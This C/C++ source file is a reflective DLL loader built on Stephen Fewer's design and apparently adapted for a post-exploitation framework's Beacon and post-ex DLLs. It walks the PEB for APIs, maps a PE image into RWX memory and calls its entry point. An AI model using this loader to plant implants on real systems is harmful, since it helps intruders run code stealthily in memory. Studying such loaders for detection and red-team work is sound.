
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {

#pragma code_seg(".text$a")
    void WINAPI ReflectiveLoader(LPVOID loaderArgument) {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86, since it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of 
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x0000000D which is why 
        * we subtract 0xD to get back to 0x0. In our testing, this value can change and can sometimes 
        * cause crashes during cleanup.
        *
        * The generated disassembly from IDA:
        *
        * text:00000000                 push    ebp
        * text:00000001                 mov     ebp, esp
        * text:00000003                 sub     esp, 24h
        * text:00000006                 push    esi
        * text:00000007                 push    edi
        * text:00000008                 call    GetLocation
        * text:0000000D                 sub     eax, 11h
        */
        void* loaderStart = (char*)GetLocation() - 0xD;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        // STEP 1: Determine the base address of whatever we are loading
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        // STEP 2: Determine the location of NtHeader
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // STEP 3: Resolve the functions our loader needs...
        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi)) {
            return;
        }

        /**
        * STEP 4: Create a new location in memory for the loaded image...
        * We're using PAGE_EXECUTE_READWRITE as it's an example.
        */
        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, rawDllNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return;
        }
        else {
            PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
        }

        // STEP 5: Copy in our headers/sections...
        if (!CopyPEHeader(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE header. Exiting..\n");
            return;
        };
        if (!CopyPESections(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE sections. Exiting..\n");
            return;
        };

        // STEP 6: Resolve rdata information
        RDATA_SECTION rdata = { 0 };
        if (!ResolveRdataSection(rawDllBaseAddress, loadedDllBaseAddress, &rdata)) {
            PRINT("[-] Failed to resolve rdata information. Exiting..\n");
            return;
        };

        // STEP 7: Process the target DLL's import table...
        ResolveImports(rawDllNtHeader, loadedDllBaseAddress, &winApi);

        // STEP 8: Process the target DLL's relocations...
        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress);

        // STEP 9: Find the target DLL's entry point
        ULONG_PTR entryPoint = loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        /**
        * STEP 10: Call the target DLL's entry point
        * We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
        */
        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // Call DllMain twice to ensure that post-ex DLL is set up correctly.
        PRINT("[*] Calling the entry point\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, &rdata);
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 4, loaderArgument);
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")
